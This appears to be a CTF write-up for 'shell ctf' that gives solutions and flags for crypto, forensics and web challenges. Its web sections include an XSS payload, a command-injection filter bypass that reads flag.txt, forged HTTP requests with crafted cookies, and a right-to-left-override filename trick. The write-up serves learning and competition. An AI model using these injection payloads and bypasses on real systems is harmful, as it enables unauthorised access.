# shell ctf , 12/8/2022 , 0xcha0s 


## world's greatest detective (misc)

-> Wakandan Translator :

```
SHELLCTF{W4kandA_F0rev3r}
```

## MALBORNE (crypto)

https://malbolge.doleczek.pl/

```
SHELL{m41b01g3_15_my_n3w_l4ngu4g3} 
```

## tweeeeeet (crypto)


![image](https://user-images.githubusercontent.com/67979878/184498534-72be9658-c726-4216-ae84-4c74d97738ea.jpeg)

![tweet_cipher](https://user-images.githubusercontent.com/67979878/184498536-dedd2c44-ac59-47dd-ad3e-cf2a59196bba.png)


birds cipher : `SHELL{WELOVESINGING}`

## Feel ME (crypto)

https://ezgif.com/video-to-jpg/

get frames of the video , decode it:

braille cipher 

https://www.dcode.fr/braille-alphabet


## Tring Tring (crypto)

```
----. ----. ----. / -.... -.... -.... / ---.. ---.. / ..--- ..--- ..--- / ..--- / -.... -.... / --... --... --... / ...-- ...-- / ..--- / ...-- / -.... / ----. ----. ----. / --... --... --... --... / -.... / --... --... --... --...
```

morse code decode -> `9996668822226677733236999777767777`

decode : https://www.dcode.fr/code-multitap-abc

`SHELLCTF{YOUCANREADMYSMS}`


## Alien voice (Forensics)

Spectrum analyzer : 

https://academo.org/demos/spectrum-analyzer/



## Secret document (Forensics)

from description : `"shell is the key if you did'nt get it xorry"`

XOR File with `shell` key , render image and get the flag 

```
shell{y0u_c4n_s33_th3_h1dd3n}
```


## Go deep (Forensics)


given a file.wav files , it is protected like MR.robot with **deepsound** software 

the pass is "shell" , will get flag content
```
SHELL{y0u_w3r3_7h1nk1ng_R3ally_D33p}
```


## Heaven (Forensics)


stegsolve > analysis > data-extract -> check all 7s because `I was in the seventh heaven painted red green and blue`


```
SHELL{ma n1pul4t1ng_w1th_ 31ts_15_3A5y}
```

## Hidden (Forensics)

- given image , exiftool got `the password is shell`
- ``steghide extract`` get the pdf file , flag.zip protected , troll
- pdf file has text in white color `the flag is shellctf`
- we got the flag 

```
shell{y0u_g07_th3_flag_N1c3!}
```



## choosy (web)

xss  payload :

```html
<img src=x onerror=alert(1)>
```
```
shellctf{50oom3_P4yL0aDS_aM0ng_Maaa4nnY}
```



## ILLUSION (web)

RCE FILTER :

ls is filtered --> llss executed

keep enumerating :

```bash
ccdd .. ..; llss;ccdd .. ..;llss;cat flag.txt
```


```
shellctf{F1l73R5_C4n'T_Pr3v3N7_C0mM4nd_1nJeC71on}
```

## colour cookie (web)


check css comments : 
http://20.125.142.38:8326/static/base_cookie.css --> 

```
/*   name="C0loR"  */
```

http://20.125.142.38:8326/check?name=name&C0loR=blue


```
shellctf{C0ooooK13_W17h_c0ooorr3c7_Parr4m37er...}
```


## Extractor (web)

- sqlite injeciton UNION based 


## MORE ILLUSION (web)


http://20.193.247.209:8822/wH4t_Y0u_d1d?Th1nK_Tw1c3=ccdd+..+..;ccdd+flag-------------;ccdd+flag;ccdd+flag;ccdd+flag;ccdd+flag;cat+flag.txt


```
shellctf{H0p3_4ny0N3_No7_n071c3_SiZe_D1fF3reNc3_du_apparent-size_ah}
```

## RAW-Agent (web)

the challenge has 2 parts :

- `Only Agent Vinod is allowed` and we have cookie hex `77686f616d5f695f616d:55736572`

- send request again with `User-Agent: Vinod`

- `I will give you something Intresting Today at atleast -3 hrs from now : Current Time is :  14:08:44`

- `Date: Wed, 21 Oct 2015 07:28:00 GMT`  <= add the header 

- Found ciphered image , pokemon cipher -> https://www.dcode.fr/pokemon-unown-alphabet

- USSERAGENT <= first part of the flag

- cookie => hex(Admin)  => 41646d696e

```
GET / HTTP/1.1
Host: 20.125.142.38:8525
User-Agent: Vinod
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Date: Wed, 21 Oct 2015 07:28:00 GMT
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: 77686f616d5f695f616d=41646d696e
Upgrade-Insecure-Requests: 1

```

- Find PNG image , use `zsteg` found base64 data 

"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xTmxsVnJtckhkTEhSZ1g2c1Y1MzlMMVp6Ym5SR0N2ZHIvdmlldz91c3A9c2hhcmluZw"

- decode it find dive link contains encrypted ``flag.7z``

- ``7z2john flag.7z > hash.txt``

```
GET / HTTP/1.1
Host: 20.125.142.38:8525
User-Agent: Vinod
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Date: Wed, 21 Oct 2015 07:28:00 GMT
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```

- brainfuck obfustication :
```

<!-- ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++++.>++++.+++++++++++++++++.<++++++++++++++++++.>----------.-.<<++.>----------------.>+.--------.--.+++++++++++.-------.<<.>-------.>.+++.+++.+++++.-----------.------.<<.>.>--.++.+++++.-------.++++++++++++.+++.<<.>+++++++.>+++++++++.-------.<+++++++++++++.>----.++++++.--.+++.--------.<<.>-----------------.>++++++.++++++.<++++++++++++++++++++.>----.<-.++++++++.<.>------------------------------.>----------------.++++++++++++++++++.---.+++.--------.<<.>+++.>--------------.++.+++++.+.+++++++++.---------.++++++++++.++.<<.>---------------.>---------.++++++++.-------------------.+++++++++++++++++.---------.--------.<<.>++++++++++++.>.++++++.+++++++.---------.+++++++++++++++++++++.-----------.-.---------.<<.>+++.<+++++++++++++++++.>>++++++.<<+++.>>--------.<--------.>++++++++++++++++++.<<--------------------.>----.>------------.--------.+++++++++++.-----.------.<<.>+++.>++++++++++++++++++++++++.------------------------.+++++++++++++++++.-----------------.+++.+++++++++++.++++.<<.>---.>-.-----------------.++++++.++++++++.-.-----.+++++++++++.---------------.<<.>+.>.+++++++++++++++++.-----------------..<<.>+++++++.>++++++++++++++++.------------------.<<++++++++++++++++++++.>>+++++++++++++++.<<---.-.----------------.>--------.>-------------.++++++++++.+++++++++.+.------.<<.>++++++++++++++++++++++.+++++++.>---.<+++.>-.++++.<<.>---------------------------------.>-----------.<---------------.>++++++++++.<---.>++++++++.<++++++++++++++++.>--------.<+++.<.>++++++++++++++.>---.+++++.-----.--.<<.>-----------.>------------.+++++++++++++++++.--------------.+.+++++++++++++++++.-------.------.+++++++++.<<.>++++++++++++++.>----.---.+++.<<++++++++++++++++.>++.>.<<----------------.>----------------.<++++++++++++++++.>>----------.++++++++++++++++++++++.<<+.>>--------------.<+++++.<+++.--------------------.>-------.>.-------.--.+++++++++++++++++.--.---.-----------.+.<<.>.>++++++++++++++.----------------.--.+++++++++++++++++++++.---------------------.+++++++++++.---.----.+++++++++++++.<<.>++.>-----------------.+++++++++++++++++.---------------.+++++.+++++++.--.+++.<<.>+++++++++++++++++++.>+++++++++.<+++++++++++++.------.>-------.<+++.+.<.++++++++++++++++++++++++++++++++++.>>------.<----.>++++++++++++++.<++++++++.++.------.+++++++++.<<++++++++++++++++++++++.>+++++.>++++.-------------.+++++++++.-----.+++++.----.---------.-->

```

- decode it will find a list to use at cracking the `flag.7z`

- `_p4raM37eR_P0llu7iOn}`



## DOC Holder (web)

=> Right-to-Left Override Attack 

```
Hint 1: Think from right to left
Hint 2: Everything is just related to name and extension of file not content in file ...
Hint 3: Give me file with name while when seen from eyes look like abc.pdf but its not actually pdf
Hint 4: Make file name "abc.fdp" look "abc.pdf"
```

filename = a.fdp. => reveal the flag 


```
-----------------------------13577368038319958892918869259
Content-Disposition: form-data; name="file"; filename="Alien_voice.fdp."
Content-Type: audio/x-wav
```


```
shellctf{R1ghtt_t0_l3ft_0veRiDe_1s_k3Y} 
```
